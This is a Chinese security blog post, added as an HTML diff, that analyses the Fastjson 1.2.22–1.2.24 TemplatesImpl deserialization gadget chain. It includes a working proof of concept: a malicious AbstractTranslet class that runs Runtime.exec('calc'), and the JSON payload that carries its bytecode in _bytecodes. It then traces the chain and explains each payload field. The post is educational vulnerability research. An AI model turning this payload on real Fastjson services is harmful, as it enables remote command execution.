@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="title: Fastjson反序列化之TemplatesImpl调用链date: 2019-05-12 08:15:41tags: Java安全  FastJson基础知识 Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。项目地址:https://github.com/alibaba/fastjso">
+<meta name="keywords" content="P0rZ9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="P0rZ9&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="title: Fastjson反序列化之TemplatesImpl调用链date: 2019-05-12 08:15:41tags: Java安全  FastJson基础知识 Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。项目地址:https://github.com/alibaba/fastjso">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.10.49.01-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.39.58-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.40.49-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.44.53-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.45.52-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.48.09-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.56.36-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.01.44-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.10.28.32-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.25.26-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.26.47-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.11.21.29-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.15.43.33-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.14.10.18-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.15.15.42-image.png">
+<meta property="og:updated_time" content="2019-05-23T14:34:43.705Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="P0rZ9&#39;s blog">
+<meta name="twitter:description" content="title: Fastjson反序列化之TemplatesImpl调用链date: 2019-05-12 08:15:41tags: Java安全  FastJson基础知识 Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。项目地址:https://github.com/alibaba/fastjso">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.10.49.01-image.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="../../../../images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>P0rZ9&#39;s blog</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="../../../../css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="../Weblogic-2017-10271分析/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson基础知识"><span class="toc-number">1.</span> <span class="toc-text">FastJson基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl利用链"><span class="toc-number">2.1.</span> <span class="toc-text">TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件"><span class="toc-number">2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC分析"><span class="toc-number">2.1.3.</span> <span class="toc-text">POC分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁绕过"><span class="toc-number">2.2.</span> <span class="toc-text">补丁绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">P0rZ9's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-05-23T14:05:07.708Z" itemprop="datePublished">2019-05-23</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <hr>
+<p>title: Fastjson反序列化之TemplatesImpl调用链<br>date: 2019-05-12 08:15:41<br>tags: Java安全</p>
+<hr>
+<h2 id="FastJson基础知识"><a href="#FastJson基础知识" class="headerlink" title="FastJson基础知识"></a>FastJson基础知识</h2><blockquote>
+<p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。项目地址:<a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a>                </p>
+</blockquote>
+<p>简单举个例子说明Fastjson的使用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class FastJsonDemo &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        User user = new User();</span><br><span class="line">        user.setAge(18);</span><br><span class="line">        user.setName(&quot;Tom&quot;);</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        String eneity = JSON.toJSONString(user);  //eneity：&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Tom&quot;&#125;</span><br><span class="line"></span><br><span class="line">        //指定序列化后的type</span><br><span class="line">        String eneity2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(eneity2);</span><br><span class="line">        </span><br><span class="line">        //利用parse()反序列化</span><br><span class="line">        User user1 = (User) JSON.parse(eneity2);</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">        //利用parseObject()反序列化,返回的是一个JSONObject对象</span><br><span class="line">        Object obj = JSON.parseObject(eneity2);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //返回指定的对象</span><br><span class="line">        Object obj1 = JSON.parseObject(eneity2,User.class);</span><br><span class="line">        System.out.println(obj1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Output:			</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Day10.User&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;Tom&quot;&#125;</span><br><span class="line">Tom</span><br><span class="line">&#123;&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:18&#125;</span><br><span class="line">Day10.User@b2bfe1</span><br></pre></td></tr></table></figure></p>
+<p>另外要知道反序列化的2个方法(<code>parse()</code>与<code>parseObject()</code>)的区别：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseObject()本质上是调用parse()进行反序列化的，只是在最后多了一步**JSON.toJSON**操作。所以在反序列化的区别是:parse()会识别调用目标类的setter方法，而parseObject()会额外调用getter方法。但是这两个都会调用一些特殊的getter方法(后面会讲)</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
+<p>Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行</p>
+</blockquote>
+<h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><blockquote>
+<p><strong>实质</strong>:Fastjson通过<code>bytecodes</code>字段传入恶意类，调用outputProperties属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行        </p>
+</blockquote>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>Fastjson Version:1.2.22-1.2.24 因为之间的版本支持<code>SupportNonPublicField</code><br>使用parseObject时:<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></p>
+<p>虽然利用条件比较苛刻，但是漏洞思路还是值得学习的。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>将环境搭建起来:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">EvilObject.java</span><br><span class="line">public class EvilObject extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    public EvilObject() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        EvilObject evilObject = new EvilObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">将EvilObject.java编译供后面使用</span><br><span class="line">TemplatesImplPoc.java</span><br><span class="line">public class TemplatesImplPoc &#123;</span><br><span class="line"></span><br><span class="line">    public static String readClass(String cls)&#123;</span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        try &#123;</span><br><span class="line">            IOUtils.copy(new FileInputStream(new File(cls)), bos);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void  test_autoTypeDeny() throws Exception &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\target\\classes\\org\\lain\\poc\\TemplatesImpl\\EvilObject.class&quot;;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +</span><br><span class="line">                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +</span><br><span class="line">                &quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String args[])&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>开始分析</p>
+<blockquote>
+<p>在parseObject()处下一断点，简单走一遍流程</p>
+</blockquote>
+<p>首先会将传入的参数进行一些处理(去除<code>_</code>)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.10.49.01-image.png" alt="2019-05-13.10.49.01-image.png"></p>
+<p>处理<code>_bytecodes</code>时</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.39.58-image.png" alt="2019-05-12.20.39.58-image.png"></p>
+<p>跟进<code>bytesValue()</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.40.49-image.png" alt="2019-05-12.20.40.49-image.png"><br>这里对<code>_bytecodes</code>进行了base64解码，所以应该将传入的<code>_bytecodes</code>进行base64编码</p>
+<p>当处理<code>_OutputProperties</code>时也先会将<code>_</code>去掉,然后调用该属性的get方法:<code>getOutputProperties()</code></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.44.53-image.png" alt="2019-05-12.20.44.53-image.png"></p>
+<p>跟进<code>newTransformer()</code>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.45.52-image.png" alt="2019-05-12.20.45.52-image.png"></p>
+<p>跟进<code>getTransletInstance()</code>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.48.09-image.png" alt="2019-05-12.20.48.09-image.png"></p>
+<p><code>_name</code>的值不能为null,跟进<code>defineTransletClasses()</code>:</p>
+<p>这里对<code>_bytecodes</code>的内容进行了解析，得到类(<code>_class[0]</code>)为<code>org.lain.poc.TemplatesImpl.EvilObject</code>，且判断了父类是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.20.56.36-image.png" alt="2019-05-12.20.56.36-image.png"></p>
+<p>然后返回到<code>TemplatesImpl</code>去调用<code>newInstance()</code>实例化上一步得到的类，在实例化时，调用了构造方法，执行命令<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.01.44-image.png" alt="2019-05-12.21.01.44-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.10.28.32-image.png" alt="2019-05-13.10.28.32-image.png"></p>
+<p>pop攻击链:<br><code>getOutputProperties()--&gt;newTransformer()--&gt;getTransletInstance()--&gt;AbstractTranslet.newInstance()--&gt;...--&gt;Runtime.exec()</code>            </p>
+<p>首先<code>_bytecodes</code>会传入<code>getTransletInstance()</code>中的<code>defineTransletClasses()</code>，<code>defineTransletClasses()</code>根据<code>_bytecodes</code>去得到<code>_class</code>，最后调用<code>newInstance()</code>对<code>defineTransletClasses</code>返回的<code>_class</code>进行实例化 查看如何构造此调用链:            </p>
+<p>查看调用<code>getTransletInstance()</code>的方法:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.25.26-image.png" alt="2019-05-12.21.25.26-image.png"></p>
+<p>查看调用<code>newTransformer()</code>的方法：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-12.21.26.47-image.png" alt="2019-05-12.21.26.47-image.png"></p>
+<p>发现<code>getOutputProperties()</code>，根据Fastjson解析时，会调用属性的get方法，所以设置在poc中设置<code>OutputProperties</code>属性，使得解析过程中调用<code>getOutputProperties()</code>，形成pop链            </p>
+<p>调用链:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.11.21.29-image.png" alt="2019-05-13.11.21.29-image.png"></p>
+<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p><strong>@type</strong></p>
+<blockquote>
+<p>指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在poc中，<code>_bytecodes</code>与<code>_name</code>都是私有属性，所以要想反序列化这两个，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>            </p>
+</blockquote>
+<p><strong>_bytecodes</strong></p>
+<blockquote>
+<p>是我们把恶意类的.class文件二进制格式进行base64编码后得到的字符串        </p>
+</blockquote>
+<p><strong>_outputProperties</strong> </p>
+<blockquote>
+<p>漏洞利用链的关键会调用其参数的getOutputProperties方法 导致命令执行            </p>
+</blockquote>
+<p><strong>_tfactory:{}</strong> </p>
+<blockquote>
+<p>在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值</p>
+</blockquote>
+<p>将<code>_tfactory</code>置空，<code>defineTransletClasses()</code>调用其<code>getExternalExtensionsMap()</code>时报错</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.15.43.33-image.png" alt="2019-05-13.15.43.33-image.png"></p>
+<p>这里对poc的一些关键部分进行讲解<br><strong>1.使用_OutputProperties参数为什么最终会调用getOutputProperties()方法进而触发后面的POP攻击链</strong></p>
+<p>这里涉及到FastJson解析流程，我们先引入一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private Boolean sex;</span><br><span class="line">    private Properties prop;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line">        System.out.println(&quot;User()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void setAge(int age)&#123;</span><br><span class="line">        System.out.println(&quot;setAge()&quot;);</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Boolean getSex()&#123;</span><br><span class="line">        System.out.println(&quot;getSex()&quot;);</span><br><span class="line">        return this.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public Properties getProp()&#123;</span><br><span class="line">        System.out.println(&quot;getProp()&quot;);</span><br><span class="line">        return this.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        String s = &quot;[User Object] name=&quot; + this.name + &quot;, age=&quot; + this.age + &quot;, prop=&quot; + this.prop + &quot;, sex=&quot; + this.sex;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String eneity3 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.poc.poclist.User\&quot;, \&quot;name\&quot;:\&quot;Tom\&quot;, \&quot;age\&quot;: 13, \&quot;prop\&quot;: &#123;&#125;, \&quot;sex\&quot;: 1&#125;&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(eneity3,User.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        </span><br><span class="line">输出:			</span><br><span class="line">User()</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[User Object] name=Tom, age=13, prop=null, sex=null</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数被调用			</span><br><span class="line">public修饰的name被序列化</span><br><span class="line">private修饰的age 反序列化成功  setter函数被调用		</span><br><span class="line">private修饰的sex 未被反序列化  getter函数没有被调用		</span><br><span class="line">private修饰的prop 没有被反序列化 但是getter函数被调用</span><br></pre></td></tr></table></figure></p>
+<p>这里的sex与prop都为private变量，且都无setter方法，但是prop的getter函数被调用，sex的没有。出现这个差异的原因就是<br>我们构造poc的关键。</p>
+<p><strong>查看源码</strong>我们会发现，<code>JavaBeanInfo</code>将目标类的方法与字段遍历一遍，区分情况进行处理，会将满足条件的方法添加到fieldList列表当中 供后面的反序列化操作进行调用。<br>这里限制加载一些方法：    </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.14.10.18-image.png" alt="2019-05-13.14.10.18-image.png">    </p>
+<p>满足条件的setter：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数		</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br></pre></td></tr></table></figure></p>
+<p>满足条件的getter:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于等于4		</span><br><span class="line">非静态方法</span><br><span class="line">以get开头且第4个字母为大写</span><br><span class="line">无参数</span><br><span class="line">返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</span><br></pre></td></tr></table></figure></p>
+<p>我们上面例子中的<code>getProp()</code>返回类型为<code>Properties</code>，而<code>Properties extends Hashtable</code>，而<code>Hashtable implements Map</code>，所以<code>getProp()</code>会被调用而<code>getsex()</code>没有，那么当该get方法中存在一些危险操作的调用链，就会造成任意命令执行。这里前辈们找出了<code>getOutputProperties()</code>，<br>当解析参数<code>OutputProperties</code>时，会利用反射执行<code>getOutputProperties()</code>            </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-13.15.15.42-image.png" alt="2019-05-13.15.15.42-image.png"></p>
+<p>执行<code>getOutputProperties()</code>方法，最终会调用<code>getTransletInstance()</code>,而<code>getTransletInstance()</code>会根据<br><code>_bytecodes</code>而生成类的实例。再者因为传进去的参数都会经过 <code>key.replaceAll(&quot;\_&quot;, &quot;&quot;);</code> 处理，所以使用<code>_OutputProperties</code>参数最终会调用<code>getOutputProperties()</code>方法进而触发后面的POP攻击链。另外如果想反序列化上面的private变量sex(与poc中的<code>_name _bytecodes</code>类似)，需要parseObject操作时设置<code>Feature.SupportNonPublicField</code>            </p>
+<p><strong>2.为什么要对<code>_bytecodes</code>的值进行base64编码</strong>                </p>
+<blockquote>
+<p>当解析参数_bytecodes时，在JSONScanner中会对其值进行base64解码，所以在传入时需要对_bytecodes的值先进行base64编码</p>
+</blockquote>
+<h3 id="补丁绕过"><a href="#补丁绕过" class="headerlink" title="补丁绕过"></a>补丁绕过</h3><p>看之后文章</p>
